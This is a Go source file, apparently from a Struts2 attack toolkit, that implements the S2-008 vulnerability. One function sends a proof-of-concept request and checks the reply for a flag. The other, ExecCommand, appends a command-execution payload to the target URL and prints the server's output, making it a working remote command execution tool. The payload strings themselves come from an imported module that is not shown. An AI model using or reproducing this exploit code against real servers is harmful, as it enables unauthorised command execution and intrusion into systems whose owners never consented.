package s008

import (
	"ST2G/cvemod/x51utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func Check(url string){
	url+=x51utils.POC_s008_check
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		log.Fatal("Error reading request. ")
	}
	client := &http.Client{Timeout: time.Second * 10}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal("Error reading response. ")
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal("Error reading body. ")
	}
	respBody := string(body)
	isVulnable := strings.Contains(respBody, x51utils.Checkflag)
	if isVulnable {
		x51utils.Colorlog("Found Struts2-008!")

	} else {
		fmt.Println("Struts2-008 Not Vulnerable.")
	}
}
func ExecCommand(url string,command string) {
	url += x51utils.POC_s008_exec(command)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		log.Fatal("Error reading request. ")
	}
	client := &http.Client{Timeout: time.Second * 10}

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal("Error reading response. ")
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal("Error reading body. ")
	}
	respBody := string(body)
	fmt.Println(respBody)
}